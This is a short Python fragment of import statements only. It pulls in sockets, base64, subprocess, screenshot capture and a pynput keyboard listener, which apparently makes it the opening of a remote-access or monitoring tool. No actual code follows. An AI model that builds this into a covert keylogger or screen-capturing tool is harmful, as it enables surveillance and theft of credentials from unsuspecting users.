import sys
import os
import socket
import time
import base64
import os
import tabulate
import signal
import shlex
import platform
import io
import psutil
import subprocess
import threading
import pyscreenshot
from datetime import datetime
import Xlib
try:
    from pynput.keyboard import Listener
    HAVE_X = True
except Xlib.error.DisplayNameError:
    HAVE_X = False